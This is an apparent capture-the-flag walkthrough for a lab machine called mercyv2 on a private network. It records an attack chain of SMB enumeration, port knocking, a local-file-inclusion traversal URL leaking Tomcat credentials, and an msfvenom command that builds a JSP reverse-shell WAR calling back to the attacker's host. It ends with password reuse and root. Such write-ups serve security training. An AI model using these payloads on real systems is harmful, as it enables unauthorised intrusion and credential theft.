```
export IP=192.168.56.102
```
## Summary
1. Nmap scanning -> found apache tomcat running on 8080.
2. SMB enumeration -> found real users -> logged in with weak password.
3. Download contents  -> found configs -> port knocking opened port 80 and 22.
4. Website has LFI -> leak tomcat credentials -> logged in as admin/manager -> RCE -> reverse shell. 
5. Password reuse -> logged in as user fluffy.
6. Ran `pspy` -> observed background processes -> root.
## Nmap Results
Web service: `Apache Tomcat/7.0.52 `
user creds -> conf/tomcat-users.xml  or /etc/tomcat7/tomcat-users.xml
manager login page - > http://192.168.56.102:8080/manager/html. If logged in, could lead to RCE

https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html

![](../../Assets/images/Pasted%20image%2020220804215225.png)

http://192.168.56.102/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml

```
..SNIP...
<? <role rolename="admin-gui"/>
<? <role rolename="manager-gui"/>
<? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
<? <user username="fluffy" password="freakishfluffybunny" roles="none"/>
<? </tomcat-users>
```


<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/mercyv2]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.157 LPORT=1234 -f war -o revshell.war
</pre>

![](../../Assets/images/Pasted%20image%2020220804221830.png)

```
qiu:password
fluffy:freakishfluffybunny
```

![](../../Assets/images/Pasted%20image%2020220804224457.png)

## Resource
1. https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat